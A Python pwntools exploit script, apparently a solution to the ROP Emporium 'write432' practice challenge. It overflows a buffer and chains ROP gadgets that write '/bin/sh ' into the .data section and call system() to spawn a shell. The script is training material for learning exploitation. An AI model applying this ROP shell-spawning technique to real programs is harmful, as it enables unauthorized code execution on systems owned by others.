#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
elf = ELF("./write432")

pop_two_addr = p32(0x080486da) # pop edi; pop ebp; ret;
mov_addr = p32(0x08048670) # mov [edi], ebp;
data_addr = 0x0804a028 # memory address of the .data section
system_addr = p32(0x08048430) # address to system()

'''
Note that we have to write the string "/bin/sh " 4 bytes at a time since this 
is a 32-bit binary. In the 64-bit version, we can write the whole string in one
go as an 8 byte write.
'''

payload = "A"*44 # Overflow the buffer
payload += pop_two_addr # Jump to the 'pop edi; pop ebp; ret;' gadget
payload += p32(data_addr) # Pop this into edi
payload += "/bin" # Pop this into ebp

# mov [edi], ebp will move "/bin" into the memory location stored in edi
payload += mov_addr

'''
Now repeat the same thing with the remaining of the string, taking note of
the fact that you have to remember to do two things:

1. Add four bytes to the address of the .data section, otherwise you will
   overwrite the "/bin" string with "/sh "

2. Ensure there is a trailing space in "/sh ". This is important as otherwise
   it will probably get replaced by a null byte (in order to make it 4 bytes in
   size). The null byte might cause the exploit to not work as intended.
'''

payload += pop_two_addr
payload += p32(data_addr + 0x4)
payload += "/sh "
payload += mov_addr

'''
Right now, the .data section contains the string "/bin/sh ". We can now call
system just like we did for the 'split32' challenge by setting up the stack
such that the mov gadget from above returns to system()
'''

payload += system_addr # Return to the system() function from the mov gadget
payload += p32(0xdeadbeef) # Return address for system doesn't matter
payload += p32(data_addr) # Location in memory of "/bin/sh "

sh = elf.process()

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()
